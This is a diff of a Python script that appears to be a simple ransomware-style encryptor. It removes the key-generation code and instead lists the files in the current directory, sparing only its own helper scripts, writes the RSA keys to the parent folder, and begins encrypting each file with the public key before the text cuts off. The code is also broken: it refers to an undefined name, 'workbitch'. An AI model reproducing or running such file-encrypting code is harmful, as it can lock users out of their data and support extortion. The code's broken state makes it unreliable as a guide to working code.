@@ -4,34 +4,35 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 import os
+import Privkey
 
-# Generating a key
-private_key = rsa.generate_private_key(
-        public_exponent=65537,
-        key_size=2048,
-        backend=default_backend()
-    )
-public_key = private_key.public_key()
+list = os.listdir(path='.')
+list.remove("KeyGen.py")
+list.remove("Decrypt.py")
+list.remove("Privkey.py")
+
+Privkey.private()
+
+public_key = Privkey.private_key.public_key()
 
 # Storing the keys
-key = private_key.private_bytes(
+key = workbitch.private_key.private_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PrivateFormat.PKCS8,
         encryption_algorithm=serialization.NoEncryption()
     )
-privkey = open('private_key.pem', 'wb')
+privkey = open('..\private_key.pem', 'wb')
 privkey.write(key)
 
 key = public_key.public_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PublicFormat.SubjectPublicKeyInfo
     )
-pubkey = open('public_key.pem', 'wb')
+pubkey = open('..\public_key.pem', 'wb')
 pubkey.write(key)
 key = ""
 
 # Encrypting
-# list = os.listdir(path='.')
 for x in list:
     file = open(x, "rb")
     encrypt = public_key.encrypt(
